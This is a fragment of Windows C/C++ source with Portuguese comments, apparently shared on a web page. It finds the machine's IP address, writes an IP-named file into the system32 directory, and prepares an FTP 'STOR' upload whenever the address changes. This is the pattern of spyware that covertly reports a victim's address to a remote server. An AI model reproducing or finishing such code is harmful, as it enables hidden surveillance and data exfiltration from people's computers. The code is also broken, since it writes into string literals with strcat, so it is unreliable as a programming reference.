                        WSAStartup(0x101, &wsa);          // inicia winsock

                        gethostname(nome,sizeof(nome));   // nome do PC
                        IP = gethostbyname(nome);         // atribui a variavel

                        for (int i=0;IP-&gt;h_addr_list[i];i++)                        // IP da internet
                        {
                                ip_net = inet_ntoa(*((in_addr *)IP-&gt;h_addr_list[i]));
                        }

                        WSACleanup();       // Fecha winsock


                        if(ip_net != "127.0.0.1" && ip_net != ip_anterior)      //mandar e-email caso o IP seja diferente e ligado a NET
                        {
                                ip_anterior = ip_net;                           //colocar novo IP num vartmp


                                GetSystemDirectory((char *)dir_sys_win,100);                  //busca %WINDIR/SYSTEM32


                                strcat(dir_sys_win,"\\");                                     //concatena  %WINDIR/SYSTEM32 '//'

                                strcat(dir_sys_win,ip_net.c_str());                          //da nome ao arquivo(IP)

                                strcat(dir_sys_win,".txt");                                  //seta extensao .txt

                                DeleteFile(dir_sys_win);                                     //deleta para recriar



                                strcat(ip_anterior.c_str(),".txt\r\n");              //seta extensao para o arquivo a ser enviado

                                arq_ftp = strcat("STOR ",ip_anterior.c_str());       //caminho completo do arquivo a ser enviado

                                ftp();

                        }


              }


}
  </pre>
  <br>
 </td></tr>
 </table>
</body>
</html>